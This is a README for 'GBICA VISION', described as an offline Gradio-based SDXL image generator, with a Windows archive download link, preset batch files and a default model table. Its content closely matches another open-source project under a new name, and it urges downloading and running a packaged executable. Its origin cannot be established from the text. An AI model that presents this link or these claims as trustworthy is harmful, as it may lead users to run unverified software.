<div align="center">
<img src="https://github.com/lllyasviel/GBICA-VISION-/assets/19834515/483fb86d-c9a2-4c20-997c-46dafc124f25" alt="GBICA VISION">
</div>

# GBICA VISION 🌹

[>>> Click Here to Install GBICA VISION 🌹 <<<](#download)

GBICA VISION 🌹 is an offline, open-source, free image generation software based on [Gradio](https://www.gradio.app/). It focuses on ease of use: minimal setup, simple prompts, and high-quality results without complex tweaking.  

**Minimal GPU memory required: 4GB (Nvidia).**  

---

## Features

- High-quality text-to-image generation with minimal prompt engineering.
- Image-to-image transformations (Upscale, Variation, Inpaint, Outpaint).
- Advanced prompt processing with GPT-2-based engine.
- Support for multi-prompts, prompt weights, LoRAs, and wildcards.
- Multiple presets: Realistic, Anime, and Custom.
- Lightweight UI with offline operation.

---

## Download

### Windows

**[>>> Click here to download <<<](https://github.com/lllyasviel/GBICA-VISION-/releases/download/v2.5.0/GBICA-VISION-_win64_2-5-0.7z)**  

After download, extract the file and run `run.bat` (or `run_anime.bat` / `run_realistic.bat` for different presets). The software will download the required models automatically.  

> Minimal requirements: 4GB GPU, 8GB RAM.  

---

## Default Models

| Task      | Preset File | Main Model                  |
|-----------|-------------|-----------------------------|
| General   | run.bat     | juggernautXL_v8Rundiffusion |
| Realistic | run_realistic.bat | realisticStockPhoto_v20     |
| Anime     | run_anime.bat | animaPencilXL_v500          |

Models are automatically downloaded on first run.

---

## Troubleshoot

- If you see `MetadataIncompleteBuffer` or `PytorchStreamReader` errors, re-download models.  
- Ensure enough free disk space (40GB recommended).  

---

## Thanks

Thanks to contributors [twri](https://github.com/twri), [3Diva](https://github.com/3Diva), [Marc K3nt3L](https://github.com/K3nt3L), and the open-source SDXL community for making this possible.
